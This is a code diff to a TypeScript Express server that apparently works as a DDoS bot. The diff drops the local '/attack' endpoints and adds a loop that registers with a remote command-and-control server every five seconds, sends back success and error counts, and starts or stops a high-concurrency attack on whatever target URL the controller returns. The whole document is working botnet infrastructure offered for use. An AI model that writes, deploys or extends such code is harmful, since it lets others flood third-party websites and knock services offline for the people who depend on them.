@@ -3,6 +3,7 @@ import bodyParser from "body-parser";
 import { Stats } from "./stats";
 import { Attacker } from "./attacker";
 import cors from "cors";
+import superagent from "superagent";
 
 // Create Express server
 const app = express();
@@ -16,30 +17,31 @@ app.use(bodyParser.json());
 app.use(bodyParser.urlencoded({ extended: true }));
 app.use(cors({origin: '*',}));
 app.get('/', (req, res) => {
-    if(stats.isRun) {
-        res.status(200).send({
-            target: stats.target,
-            success: stats.success,
-            error: stats.error,
-            loop: stats.loop
-        });
-    } else {
-        res.status(200).send(null);
-    }
+    res.status(200).send("OK");
 });
 
-app.post('/attack', (req, res) => {
-    if(!req.body.target) {
-        res.sendStatus(400);
-        return;
+const sendUpdate = () => {
+    if(!stats.isRun) {
+        stats.reset();
     }
-    attacker.run(req.body.target, req.body.concurrency || 100, req.body.interval || 1000);
-    res.status(201).send({success: true});
-});
 
-app.delete('/attack', (req, res) => {
-    attacker.stop();
-    res.status(200).send({success: true});
-});
+    const url = `${process.env.CMD_URL}api/control/register`;
+    superagent.post(url).send({ botUrl: process.env.URL, loop: stats.loop, success: stats.success, error: stats.error }).end((err, res) => {
+        if(err) {
+            console.error(err);
+            return;
+        }
+        if(stats.isRun && !res.body.target) {
+            attacker.stop();
+            console.log(`Attack stopped`);
+        } else if(!stats.isRun && res.body.target) {
+            attacker.run(res.body.target.url, res.body.target.concurrency || 100, res.body.target.interval || 1000);
+            console.log(`Attack started for ${res.body.target.url}`);
+        }
+    });
+};
+
+setInterval(sendUpdate, 5000);
+sendUpdate();
 
 export default app;
